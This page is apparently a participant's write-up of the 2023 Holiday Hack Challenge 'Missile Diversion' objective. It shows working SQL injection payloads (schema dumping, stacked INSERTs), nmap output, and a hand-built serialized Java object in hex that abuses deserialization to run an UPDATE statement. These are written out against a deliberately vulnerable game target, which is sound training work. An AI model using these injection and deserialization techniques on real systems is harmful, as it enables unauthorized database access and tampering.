          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="missile-diversion">Missile Diversion<a class="headerlink" href="#missile-diversion" title="Permanent link">⚓︎</a></h1>
<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><br/>
<strong>Direct link</strong>: <a href="https://www.holidayhackchallenge.com/2023/client_container.zip">client_container.zip</a> and <a href="https://nanosat.one/?&amp;challenge=satmissile">NanoSat Christmas Comms</a></p>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
<div class="admonition question">
<p class="admonition-title">Request</p>
<p>Thwart Jack's evil plan by re-aiming his missile at the Sun.</p>
</div>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="tip">
<summary>Wombley Cube</summary>
<p>oh drat, did I leave the admin tools open?<br/>
For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p>
</details>
<details class="tip">
<summary>Copy-paste in VNC</summary>
<p>I was running noVNC on my mac, and spent ages retyping out messages because copy-paste didn't seem to work. Use <code>ctrl-c</code> instead of <code>command-c</code>, and check out the clipboard contents displayed in the toolbar on the left.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<h3 id="find-a-vulnerability">Find a vulnerability<a class="headerlink" href="#find-a-vulnerability" title="Permanent link">⚓︎</a></h3>
<p>Following on from my "strategy" in the last challenge of randomly clicking things and seeing what showed up, I quickly discovered that the "Debug" parameter is returning a MariaDB version, so it's worth looking for SQL injection.</p>
<details class="note">
<summary>updateDefinitions</summary>
<p>Initially, I tried adding ' into as many different places as possible and very quickly seemed to brick... something. It may have just been network issues on my end, or it may have been one of the updateDefinitions actions. Hopefully someone else had time to play with this more and see if there's anything to it. After collapsing the timeline and then travelling back to the future, I decided to be a bit more methodical since I'm too impatient to keep rebooting.</p>
</details>
<details class="note">
<summary>nmap</summary>
<p>You can also connect your host machine to the satellite and run nmap:
<div class="highlight"><pre><span></span><code>nmap -sV -Pn 10.1.1.1
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-03 22:15 NZDT
Nmap scan report for 10.1.1.1
Host is up (0.22s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
1024/tcp  open     kdm?
1112/tcp  filtered msql
1501/tcp  filtered sas-3
2038/tcp  filtered objectmanager
2100/tcp  filtered amiganetfs
2366/tcp  filtered qip-login
2718/tcp  filtered pn-requester2
2800/tcp  filtered acc-raid
3306/tcp  open     mysql?
3998/tcp  filtered dnx
5800/tcp  filtered vnc-http
7201/tcp  filtered dlip
8652/tcp  filtered unknown
10180/tcp filtered unknown
19780/tcp filtered unknown
49163/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=1/3%Time=659525EE%P=x86_64-apple-darwin19.6.0
SF:%r(NULL,6D,&quot;i\0\0\0\n11\.2\.2-MariaDB-1:11\.2\.2\+maria~ubu2204\0l\x01\
SF:0\0wwqPy43C\0\xfe\xf7-\x02\0\xff\x81\x15\0\0\0\0\0\0\x1d\0\0\x008-x:Stn
SF:JhL\&quot;d\0mysql_native_password\0&quot;)%r(GenericLines,A4,&quot;i\0\0\0\n11\.2\.2-
SF:MariaDB-1:11\.2\.2\+maria~ubu2204\0l\x01\0\0wwqPy43C\0\xfe\xf7-\x02\0\x
SF:ff\x81\x15\0\0\0\0\0\0\x1d\0\0\x008-x:StnJhL\&quot;d\0mysql_native_password\
SF:x003\0\0\x01\xffj\x04#HY000Proxy\x20header\x20is\x20not\x20accepted\x20
SF:from\x2010\.1\.1\.2&quot;)%r(LDAPBindReq,6D,&quot;i\0\0\0\n11\.2\.2-MariaDB-1:11\
SF:.2\.2\+maria~ubu2204\0\x8c\x01\0\0C94;gxD\+\0\xfe\xf7-\x02\0\xff\x81\x1
SF:5\0\0\0\0\0\0\x1d\0\0\0ImlS&lt;qGO6\]Qa\0mysql_native_password\0&quot;)%r(afp,6
SF:D,&quot;i\0\0\0\n11\.2\.2-MariaDB-1:11\.2\.2\+maria~ubu2204\0\xa0\x01\0\0OHZ
SF:m4X\?r\0\xfe\xf7-\x02\0\xff\x81\x15\0\0\0\0\0\0\x1d\0\0\0D:5;hyJCRQ!O\0
SF:mysql_native_password\0&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.39 seconds
</code></pre></div></p>
</details>
<p>The only action available is called "Debug" so that feels like the best place to start if we want to approach this in a methodical way. Click the debug action, choose submit action and edit the one argument we can to include anything. It's a string type, so it shouldn't really matter what it's set to.
Now navigate to the parameters tab and see if it's had any impact when we "getValue" on the debug:</p>
<p><img alt="Reflected output" src="../img/objectives/o22/echo.png" /></p>
<p>So now that we know it's actually being used, it's probably worth looking for various injections. Given that we already know a SQL database is being used, let's start with SQLi by submitting a single quotation:</p>
<p><img alt="SQL error" src="../img/objectives/o22/sql_error.png" /></p>
<p>Given that the debug parameter always returns the MariaDB version, it seems like it must be using the <a href="https://mariadb.com/kb/en/version/">VERSION()</a> command, so our SQL injection point must be in the <code>SELECT</code> clause.</p>
<details>
<summary>Error message confusion</summary>
<p>I got a little bit confused by the error message <code>Invalid syntax near '''</code> made me think there must be something else running, like <code>SELECT VERSION(), '&lt;user content&gt;'</code>. Huge thanks to @devastati0n on the Discord for helping me through that bit!</p>
</details>
<p>It seems to be running <code>SELECT VERSION() &lt;user content&gt;;</code>. So we can input <code>, USER()</code> and <code>, SCHEMA()</code> commands to see that the database is the <code>missile_targetting</code> system and the user is <code>targeter</code></p>
<p><img alt="Database User" src="../img/objectives/o22/user.png" /></p>
<details class="tip">
<summary>Embedded Queries and Union operators</summary>
<p>If you embed your query inside the query, eg <code>, (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 84)</code>, you're going to have a Bad Time™. So don't do that; just add the columns you want. If you want to "SELECT *" from a table, figure out how many columns it has and add <code>, 1</code> * that number - 1 and then <code>UNION</code> your select, eg <code>1, 1 UNION SELECT * FROM satellite_query</code> since the satellite_query table has three columns as shown below.</p>
</details>
<h3 id="exploit-the-vulnerability">Exploit the vulnerability<a class="headerlink" href="#exploit-the-vulnerability" title="Permanent link">⚓︎</a></h3>
<p>We can use the <code>information_schema.tables</code> and <code>information_schema.columns</code> <a href="https://mariadb.com/kb/en/information-schema-columns-table/">tables</a> to dump the table and column names, eg:
<code>UNION SELECT table_name FROM information_schema.tables</code>
<code>column_name FROM information_schema.columns WHERE table_name = &lt;name&gt;</code></p>
<table>
<thead>
<tr>
<th style="text-align: left;">Table</th>
<th style="text-align: left;"></th>
<th style="text-align: left;"></th>
<th style="text-align: left;"></th>
<th style="text-align: left;"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">satellite_query</td>
<td style="text-align: left;">jid</td>
<td style="text-align: left;">object</td>
<td style="text-align: left;">results</td>
<td style="text-align: left;"></td>
</tr>
<tr>
<td style="text-align: left;">messaging</td>
<td style="text-align: left;">id</td>
<td style="text-align: left;">msg_type</td>
<td style="text-align: left;">msg_data</td>
<td style="text-align: left;"></td>
</tr>
<tr>
<td style="text-align: left;">pointing_mode_to_str</td>
<td style="text-align: left;">id</td>
<td style="text-align: left;">numerical_mode</td>
<td style="text-align: left;">str_mode</td>
<td style="text-align: left;">str_desc</td>
</tr>
<tr>
<td style="text-align: left;">pointing_mode</td>
<td style="text-align: left;">id</td>
<td style="text-align: left;">numerical_mode</td>
<td style="text-align: left;"></td>
<td style="text-align: left;"></td>
</tr>
<tr>
<td style="text-align: left;">target_coordinates</td>
<td style="text-align: left;">id</td>
<td style="text-align: left;">lat</td>
<td style="text-align: left;">long</td>
<td style="text-align: left;"></td>
</tr>
</tbody>
</table>
<p>We can dump the pointing_mode_to_str table using <code>, numerical_mode, str_mode, str_desc FROM pointing_mode_to_str</code></p>
<p><img alt="The Pointing Modes" src="../img/objectives/o22/pointing_mode_to_str.png" /></p>
<p>And then we can see that the pointing_mode just has the missile pointed at Earth. Unfortunately, trying to update that value: <code>; UPDATE pointing_mode SET numerical_mode = 1</code> just gives us an error because the user isn't able to modify that database. Likewise, <code>INSERT</code> and <code>DELETE</code> are not allowed, nor is modifying the target_coordinates table.</p>
<p>That seems to suggest our SQL vulnerability alone won't help us achieve the goal of diverting the missile, so the next step must be to:</p>
<h3 id="find-a-second-vulnerability">Find a second vulnerability<a class="headerlink" href="#find-a-second-vulnerability" title="Permanent link">⚓︎</a></h3>
<p>The <code>satellite_query</code> table only contained one row, but boy was that an interesting row:</p>
<p><img alt="Java in the query" src="../img/objectives/o22/satellite_query.png" /></p>
<details>
<summary>What about the messaging table?</summary>
<p>The messaging table looked interesting, but less interesting than the satellite_query table.
<img alt="The Pointing Modes" src="../img/objectives/o22/messages.png" /></p>
</details>
<p>We also can't update that table, but we can insert into it using <code>; INSERT INTO satellite_query VALUES (1, 1, 1)</code>. Like in the previous challenge, we can use WireShark to extract the full Java class <a href="../img/misc/java.pcapng">in a pcap file</a>.</p>
<p>We can use <a href="https://www.w3resource.com/mysql/string-functions/mysql-hex-function.php">SQL's HEX()</a> function to extract the <code>object</code> column:
<code>, HEX(object) FROM satellite_query</code>: <code>ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661</code></p>
<p>We can then try inserting the object back into the table to see if <code>results</code> is updated:
<code>; INSERT INTO satellite_query (object) VALUES (UNHEX("aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b787000007400292f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661"))</code></p>
<details class="tip">
<summary>Invalid Stream Header</summary>
<p>The hex <em>appears</em> to need to be lower-cased before reinsertion, or it returns an "Invalid Stream Header". I did not have enough time to explore this fully to understand why and be confident lowercase really is necessary.</p>
</details>
<p>When we re-fetch the value, there are no errors, so now we can fetch the new value: <code>results FROM satellite_query WHERE jid = 3</code> (the ids normally increment, although you can fetch them separately to be sure of your jid). <code>results</code> has been populated with the original Java class, so something is clearly monitoring and using values in that table at least.</p>
<h3 id="deserialise-the-data-with-java">Deserialise the data with Java<a class="headerlink" href="#deserialise-the-data-with-java" title="Permanent link">⚓︎</a></h3>
<details class="tip">
<summary>YSoSerial</summary>
<p>I thought about using YSoSerial here since it's generally great for Java deserialization. WireGuard is already set up so making a reverse shell should be relatively easy... but YSoSerial was raising errors on my machine and some lovely people on Discord assured me it wasn't necessary. If I had more time, I would've loved to look into this more - hopefully one of the other writeups already has!</p>
</details>
<p>I don't think I've written Java since my university days almost a decade ago, so trying to write Java from scratch to deserialise the hex seemed, let's say "unappealing". I probably could've found boiler plate code pretty easily, but part of the write-up challenge was to use AI so I figured I'd give it the hex and see what it did:</p>
<p><img alt="Asking you.com for deserialisation code" src="../img/objectives/o22/you.png" /></p>
<p>It looked reasonable, and the follow up question of asking what the output would be gave a Java class called <code>SatelliteQueryFileFolderUtility</code> (although not matching the one we'd actually seen), so that felt reasonable.</p>
<p>We should start with that code, make some tweaks to add the <code>SatelliteQueryFileFolderUtility</code> code we found and then check it compiles and reserializes plausibly.</p>
<details class="tip">
<summary>The Changes I made</summary>
<p>The code AI gave me contained the example deserialization class <code>DeserializeExample</code> and a second <code>YourSerializeableClass</code>. Surprisingly, it also checked that the deserialized object was an instance of that class, so I needed to:</p>
<ol>
<li>remove the type casting and checking code,</li>
<li>replace the <code>YourSerializableClass</code> with the <code>SatelliteQueryFileFolderUtility</code> we found</li>
<li>save the file as <code>DeserializeExample.java</code></li>
<li>compile and run with <code>javac DeserializeExample.java &amp;&amp; java DeserializeExample</code></li>
</ol>
<p>The full Java code is included below.</p>
</details>
<p>The AI's code should compile reasonably easily but when we run it, we will probably see an error similar to:</p>
<div class="highlight"><pre><span></span><code><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InvalidClassException</span><span class="p">:</span><span class="w"> </span><span class="n">SatelliteQueryFileFolderUtility</span><span class="p">;</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="kd">class</span> <span class="nc">incompatible</span><span class="p">:</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="n">classdesc</span><span class="w"> </span><span class="n">serialVersionUID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1356980473442833099</span><span class="p">,</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="kd">class</span> <span class="nc">serialVersionUID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">6026304544470006199</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectStreamClass</span><span class="p">.</span><span class="na">initNonProxy</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">601</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readNonProxyDesc</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">2062</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readClassDesc</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">1909</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readOrdinaryObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">2235</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readObject0</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">1744</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">514</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">base</span><span class="o">/</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">472</span><span class="p">)</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">DeserializeExample</span><span class="p">.</span><span class="na">main</span><span class="p">(</span><span class="n">DeserializeExample</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="mi">21</span><span class="p">)</span>
</code></pre></div>
<p>The following <a href="https://stackoverflow.com/questions/10378855/java-io-invalidclassexception-local-class-incompatible">StackOverflow Q&amp;A</a> explains the problem pretty well and fortunately it's an easy fix:
<div class="highlight"><pre><span></span><code><span class="w"> </span>class SatelliteQueryFileFolderUtility implements Serializable {
<span class="gi">+    private static final long serialVersionUID = 1356980473442833099L;</span>
</code></pre></div></p>
<details class="tip">
<summary>serialVersionUID value</summary>
<p>The version UID may be different each time the host starts, so we might need to reextract the HEX each time and use whatever value is in our error message. I think the Holiday Hack team might've realised this would be confusing if your network connection died mid-challenge and hard-coded it though.</p>
</details>
<p>Now the recompiled Java should run correctly and produce a promising looking output:
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>javac<span class="w"> </span>DeserializeExample.java<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>java<span class="w"> </span>DeserializeExample<span class="w">      </span>
SatelliteQueryFileFolderUtility@4517d9a3
</code></pre></div></p>
<p>Just to be sure, we should add some serialization code and ensure that the hex output is the same as the input:</p>
<p><img alt="Asking you.com for serialisation code" src="../img/objectives/o22/you_reserialize.png" /></p>
<h3 id="create-our-exploit">Create our Exploit<a class="headerlink" href="#create-our-exploit" title="Permanent link">⚓︎</a></h3>
<p>Once we're sure that our code works, let's figure out how to create the exploit. We know we want to update the <code>pointing_mode</code> table so that <code>numerical_mode</code> is 1. We could try to use a <a href="https://snyk.io/blog/serialization-and-deserialization-in-java/">deserialization gadget</a> to either create a reverse shell to connect to, or to run Java code that creates a connection to the database and then executes the update command.</p>
<details class="tip">
<summary>The admin tools hint</summary>
<p>I got a little bit confused here because of Wombley's hint. I figured we needed someway onto the machine to access the admin tools Wombley referred to, and therefore updating the row would need to wait. Huge thanks to @Voldetort for explaining that the hint just referred to the debug ability.</p>
</details>
<p>The code would need to look something like:
<div class="highlight"><pre><span></span><code><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buildConnection</span><span class="p">();</span><span class="w"> </span><span class="c1">// somehow?</span>
<span class="n">PreparedStatement</span><span class="w"> </span><span class="n">pstmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;UPDATE pointing_mode SET numerical_mode = 1&quot;</span><span class="p">);</span>
<span class="n">pstmt</span><span class="p">.</span><span class="na">executeUpdate</span><span class="p">();</span>
</code></pre></div></p>
<p>But the <code>SatelliteQueryFileFolderUtility</code> already contains code like this, so it'd be easier just to construct it to run that code:</p>
<div class="highlight"><pre><span></span><code><span class="n">SatelliteQueryFileFolderUtility</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SatelliteQueryFileFolderUtility</span><span class="p">(</span><span class="s">&quot;UPDATE pointing_mode SET numerical_mode = 1&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
</code></pre></div>
<h3 id="serialise-the-exploit-and-upload-it">Serialise the Exploit and upload it<a class="headerlink" href="#serialise-the-exploit-and-upload-it" title="Permanent link">⚓︎</a></h3>
<p>Now that we have the exploit, we can serialise it rather than our deserialized object, and then send the exploit to the Satellite:</p>
<p><code>; INSERT INTO satellite_query (object) VALUES (UNHEX("aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174002b55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031"))</code></p>
<h3 id="check-the-pointing_mode">Check the pointing_mode<a class="headerlink" href="#check-the-pointing_mode" title="Permanent link">⚓︎</a></h3>
<p>Nothing seems to happen, but if we fetch the pointing_mode, we can see that it is now set to point at the sun rather than the Earth. Let's go back into the game to see if anything has changed.</p>
<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
<div class="admonition quote">
<p class="admonition-title">Wombley Cube</p>
<p>A... missile... aimed for Santa's sleigh? I had no idea...<br/>
I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics!
Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions.<br/>
I'll help you bring Jack to justice...<br/>
But my mission to ensure Santa never again compromises the holidays is still in progress.<br/>
It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest.<br/>
Use the door to the right to return to the resort lobby and see what happened!<br/>
Don't worry, I'll meet you there... trust me.<br/></p>
</div>
<video controls>
    <source src="../../img/misc/missile_fired.mp4" type="video/mp4">
</video>

<h2 id="java-code">Java code<a class="headerlink" href="#java-code" title="Permanent link">⚓︎</a></h2>
<p>The Java code I used for this objective is <a href="../img/misc/DeserializeExample.java">saved here</a></p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
    <a href="https://github.com/ShahneRodgers" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../js/tablesort.js"></script>
      
    
  </body>
</html>